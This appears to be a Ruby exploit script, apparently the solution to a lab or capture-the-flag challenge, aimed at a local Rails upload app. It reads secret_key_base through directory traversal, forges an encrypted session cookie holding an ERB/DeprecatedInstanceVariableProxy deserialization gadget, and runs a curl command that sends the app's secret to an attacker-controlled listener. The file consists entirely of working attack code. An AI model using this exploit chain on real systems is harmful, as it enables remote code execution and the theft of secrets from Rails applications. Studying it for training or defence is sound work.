require '../helpers/encryption_helper'
require '../helpers/servers'
require 'mechanize'
require 'erb'

include Helpers::Encryption
include Helpers::Servers

server = SimpleServer.new
server.run

# Mock out Secret.get so we don't get local errors
class Secret
  def self.get
    "LOCAL"
  end
end

Mechanize.new.instance_eval do
  begin
    # Retrieve the secret key base through directory traversal
    puts '[+] Retrieving secret key base'
    get 'http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'

    secret_key_base = page.body
                        .match(/secret_key_base = '(.*)'/)
                        .captures
                        .first

    # Retrieve the session hash  
    puts '[+] Retrieving session hash'                    
    get '/'
    session_h = cookie_jar.cookies.first.value

    # Decrypt the session hash
    puts '[+] Decrypting session hash'
    cleartext_h = decrypt_session_cookie(session_h, secret_key_base)
    
    # Create evil hash
    # Reference: 
    # http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/
    payload = '`curl -s "' + server.path + '/output?secret=#{Secret.get}"`;'
    
    erb = ERB.allocate
    erb.instance_variable_set(:@src, payload)
    proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
    
    evil_h = { "proxy" => proxy }

    # Add evil entry to the session hash
    puts '[+] Adding new key to session hash'
    cleartext_h.merge!(evil_h)

    # Encrypt the updated session hash
    puts '[+] Encrypting updated hash'
    new_h = encrypt_session_cookie(cleartext_h, secret_key_base)

    # Clear cookie jar and add our updated cookie
    puts '[+] Updating the cookie jar'
    cookie_jar.clear!

    new_cookie = Mechanize::Cookie.new('_ultimate-uploader_session', new_h).tap do |c|
      c.domain = 'localhost:3000'
      c.path = '/'
    end
    
    cookie_jar.add(history.last.uri, new_cookie)

    # Pass the cookie to the target
    puts '[+] Sending payload...'
    get '/'
    sleep 5

    # Read secret from the server logs
    puts '[+] Success'
    puts server.read_logs
          .scan(/\/output\?secret=(.*) HTTP/)
          .last[0]
          .gsub(' ', '+')

  ensure
    # Make sure to terminate server
    server.terminate
  end
end
